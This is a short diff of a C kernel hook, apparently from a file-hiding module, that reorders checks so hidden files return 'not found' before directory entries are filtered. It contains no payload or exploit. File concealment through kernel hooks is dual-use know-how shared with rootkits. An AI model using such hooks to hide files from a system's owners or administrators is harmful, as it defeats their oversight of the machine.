@@ -56,14 +56,17 @@ hook_file_open(struct file *file)
     if (hook_whitelist())
         return 0;
 
-    if (file->f_flags & O_DIRECTORY)
-        return lksu_hidden_dirent(file);
-
     retval = lksu_hidden_file(file, &hidden);
     if (unlikely(retval))
         return retval;
 
-    return hidden ? -ENOENT : 0;
+    if (hidden)
+        return -ENOENT;
+
+    if (file->f_flags & O_DIRECTORY)
+        return lksu_hidden_dirent(file);
+
+    return 0;
 }
 
 static int
